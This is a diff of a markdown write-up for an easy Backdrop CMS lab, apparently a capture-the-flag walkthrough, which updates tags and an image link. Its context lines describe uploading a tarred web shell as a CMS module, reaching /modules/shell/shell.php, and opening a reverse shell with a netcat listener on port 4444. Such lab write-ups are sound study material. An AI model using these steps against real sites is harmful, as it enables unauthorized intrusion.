@@ -3,7 +3,7 @@
 ### Lab Details 
 
 - Difficulty: Easy
-- Type: Web App, Backdrop CMS,  Linux
+- Type: Web App, Backdrop CMS, Bee, Priv Esc, Linux
 
 #### Tasks
 
@@ -124,7 +124,7 @@ $ tar -czf shell.tar.gz shell
 ```
 - select `Upload a module...` option and upload the archived shell directory 
 - access the web shell via `/modules/shell/shell.php` 
-![[Pasted image 20250718215903.png]]
+![[web shell.png]]
 - load a revershell and run `whoami`
 ```
 $ nc -lvnp 4444
